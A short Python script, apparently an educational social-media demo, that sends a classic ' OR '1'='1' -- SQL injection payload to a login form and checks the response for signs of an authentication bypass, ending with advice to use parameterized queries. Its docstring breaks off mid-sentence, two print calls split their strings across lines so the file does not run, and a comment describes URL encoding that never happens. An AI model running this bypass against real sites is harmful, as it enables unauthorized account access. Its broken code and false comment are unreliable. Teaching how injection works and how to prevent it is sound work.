#!/usr/bin/env python3
"""
SQL Injection Demo
==================
Ever wonder how hackers steal data from websites? It's often SQL injection. Here's how it works: When you log into a site, it asks a database 'Is this user legit?' But if the login form isn't secured,

⚠️  EDUCATIONAL PURPOSES ONLY — Get proper authorization before testing.
📺  Watch the video walkthrough on our Instagram!
📅  2026-02-27 10:24:06
"""

import requests
import urllib.parse

class SQLiTester:
    """
    Basic SQL injection tester for educational purposes.
    Demonstrates classic authentication bypass technique.
    """
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_login_bypass(self, username_field='username', password_field='password'):
        """
        Tests for SQL injection vulnerability in login form.
        Uses classic ' OR '1'='1 payload to bypass authentication.
        """
        
        # Classic SQL injection payload for authentication bypass
        malicious_password = "' OR '1'='1' -- "
        
        # Prepare the payload - URL encode to avoid issues
        payload = {
            username_field: 'admin',
            password_field: malicious_password
        }
        
        print(f"[+] Testing: {self.target_url}")
        print(f"[+] Payload: {malicious_password}")
        
        try:
            # Send POST request with injection payload
            response = self.session.post(self.target_url, data=payload)
            
            # Check for successful bypass indicators
            if response.status_code == 200:
                # Common success indicators (customize for target)
                success_indicators = ['welcome', 'dashboard', 'logout', 'admin']
                
                for indicator in success_indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"[!] POTENTIAL VULNERABILITY DETECTED!")
                        print(f"[!] Response contains '{indicator}'")
                        return True
                
                print(f"[-] No obvious success indicators found")
                return False
                
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

# Example usage
if __name__ == "__main__":
    # WARNING: Only test on authorized systems!
    # Example vulnerable test site: http://testphp.vulnweb.com
    
    tester = SQLiTester("http://example.com/login.php")
    is_vulnerable = tester.test_login_bypass()
    
    if is_vulnerable:
        print("
[!] Site may be vulnerable to SQL injection!")
        print("[!] Recommendation: Use parameterized queries/prepared statements")
    else:
        print("
[-] No obvious vulnerability detected")
        print("[-] Note: This is a basic test only")
